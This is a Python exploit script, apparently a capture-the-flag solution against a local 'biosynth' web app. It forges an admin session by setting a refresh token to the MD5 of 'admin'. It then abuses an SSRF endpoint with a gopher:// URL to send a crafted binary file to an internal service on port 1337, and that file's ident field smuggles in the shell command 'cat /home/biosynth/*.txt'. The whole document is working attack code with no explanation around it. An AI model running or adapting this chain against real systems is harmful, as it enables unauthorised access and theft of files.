#!/usr/bin/env python3
import hashlib
import struct
import urllib.parse

import requests
from pwn import *

BASE_URL = "http://localhost:8000"
COMMAND  = "cat /home/biosynth/*.txt"

context.arch = "amd64"
context.os   = "linux"

MAGIC = b"BSF\x01"

def make_bsf(ident: bytes, data: bytes) -> bytes:
    header = MAGIC + struct.pack("BB", len(ident), len(data))
    return header + ident + data


def build_ident() -> bytes:
    filler = b"A" * 20
    inject = b"; " + COMMAND.encode() + b" #"
    return filler + inject


def make_exploit_bsf() -> bytes:
    ident = build_ident()
    data  = b"A" # data field is irrelevant; must be non-empty to pass header check
    return make_bsf(ident, data)


def gopher_encode(host: str, port: int, data: bytes) -> str:
    """
    Encode arbitrary bytes as a gopher:// URL.
    curl's gopher handler sends everything after the selector verbatim.
    """
    encoded = urllib.parse.quote(data, safe="")
    return f"gopher://{host}:{port}/_{encoded}"


def get_admin_session() -> requests.Session:
    refresh_token = hashlib.md5(b"admin").hexdigest()
    session = requests.Session()
    session.cookies.set("refresh_token", refresh_token, path="/refresh.php")
    session.post(f"{BASE_URL}/refresh.php").raise_for_status()
    return session


def ssrf(session: requests.Session, url: str) -> str:
    resp = session.post(f"{BASE_URL}/experiment.php", data={"url": url})
    resp.raise_for_status()
    marker_open  = '<pre class="result-pre">'
    marker_close = "</pre>"
    start = resp.text.find(marker_open)
    if start == -1:
        return ""
    start += len(marker_open)
    return resp.text[start:resp.text.find(marker_close, start)]


if __name__ == "__main__":
    bsf = make_exploit_bsf()

    admin = get_admin_session()
    log.info("[+] Admin session obtained")

    url = gopher_encode("127.0.0.1", 1337, bsf)
    log.info(f"[+] Sending gopher payload ({len(bsf)} bytes)")
    out = ssrf(admin, url)
    log.info(f"[+] Response: {out}")


